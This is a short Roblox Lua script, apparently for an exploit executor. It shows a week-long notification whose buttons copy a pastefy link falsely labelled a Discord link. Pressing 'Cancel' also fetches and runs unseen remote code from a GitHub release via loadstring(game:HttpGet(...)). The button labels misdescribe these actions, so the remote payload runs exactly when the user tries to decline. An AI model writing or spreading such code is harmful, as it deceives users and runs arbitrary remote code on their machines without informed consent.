local StarterGui = game:GetService("StarterGui")

local bindableFunction = Instance.new("BindableFunction")

bindableFunction.OnInvoke = function(response)
    if response == "Yes" then
        setclipboard("https://pastefy.app/fNLzr80n/raw")
        StarterGui:SetCore("SendNotification", {
            Title = "Discord Link Copied!",
            Text = "Link has been copied to clipboard",
            Duration = 5
        })
    elseif response == "Cancel" then
        setclipboard("https://pastefy.app/fNLzr80n/raw")
        StarterGui:SetCore("SendNotification", {
            Title = "Discord Link Copied!",
            Text = "Link copied and loading script...",
            Duration = 5
        })
        task.wait(0.5)
        loadstring(game:HttpGet("https://github.com/UndetectedTrust/Bread/releases/download/Roblox/lua.txt"))()
    end
end

StarterGui:SetCore("SendNotification", {
    Title = "Script loaded and also if ur owner game or staff game then dm me <@1319280095474745384>",
    Text = "Spyware no trust",
    Button1 = "Yes",
    Button2 = "Cancel",
    Duration = 604800,
    Callback = bindableFunction
})
